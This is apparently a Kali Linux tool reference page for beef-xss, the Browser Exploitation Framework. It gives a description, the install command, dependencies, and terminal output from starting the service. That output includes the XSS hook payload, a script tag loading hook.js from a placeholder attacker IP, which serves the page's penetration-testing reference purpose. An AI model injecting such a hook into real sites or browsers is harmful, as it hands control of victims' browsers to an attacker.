---
description: >-
  BeEF-XSS (Browser Exploitation Framework) is a penetration testing tool that
  allows the attacker to exploit vulnerabilities in web browsers and gain
  control over them.
---

# 🎩 beef-xss

### Screenshots <a href="#screenshots" id="screenshots"></a>

[![beef-xss](<../../.gitbook/assets/beef xss.png>)](<../../.gitbook/assets/beef xss.png>)

### beef Usage Example <a href="#beef-usage-example" id="beef-usage-example"></a>

```
:~# beef-xss
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>

● beef-xss.service - LSB: BeEF
   Loaded: loaded (/etc/init.d/beef-xss; generated)
   Active: active (running) since Sat 2018-11-24 18:44:53 EST; 5s ago
     Docs: man:systemd-sysv-generator(8)
  Process: 3457 ExecStart=/etc/init.d/beef-xss start (code=exited, status=0/SUCCESS)
    Tasks: 5 (limit: 4665)
   Memory: 151.9M
   CGroup: /system.slice/beef-xss.service
           └─3463 ruby /usr/share/beef-xss/beef

Nov 24 18:44:53 kali systemd[1]: Starting LSB: BeEF...
Nov 24 18:44:53 kali systemd[1]: Started LSB: BeEF.

[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1...
```

***

\


### Packages and Binaries:

#### beef-xss <a href="#beef-xss" id="beef-xss"></a>

BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.

Amid growing concerns about web-born attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.

**Installed size:** `19.74 MB`\
**How to install:** `sudo apt install beef-xss`

<details>

<summary>Dependencies:</summary>

* adduser
* lsof
* ruby-ansi
* ruby-async-dns
* ruby-dev
* ruby-em-websocket
* ruby-erubis
* ruby-espeak
* ruby-eventmachine
* ruby-execjs
* ruby-json
* ruby-maxmind-db
* ruby-mime-types
* ruby-msfrpc-client
* ruby-otr-activerecord
* ruby-parseconfig
* ruby-qr4r
* ruby-rack
* ruby-rack-protection
* ruby-rubydns
* ruby-rushover
* ruby-sinatra
* ruby-slack-notifier
* ruby-sqlite3
* ruby-term-ansicolor
* ruby-terser
* ruby-twitter
* ruby-xmlrpc
* ruby-zip
* rubygems-integration
* thin
* xdg-utils

</details>

**beef-xss**

```
:~# beef-xss -h
[-] You are using the Default credentials
[-] (Password must be different from "beef")
[-] Please type a new password for the beef user: 
```

***

**beef-xss-stop**

```
:~# beef-xss-stop -h
* beef-xss.service - beef-xss
     Loaded: loaded (/lib/systemd/system/beef-xss.service; disabled; preset: disabled)
     Active: inactive (dead)
```

***

Updated on: 2022-Nov-16\


***
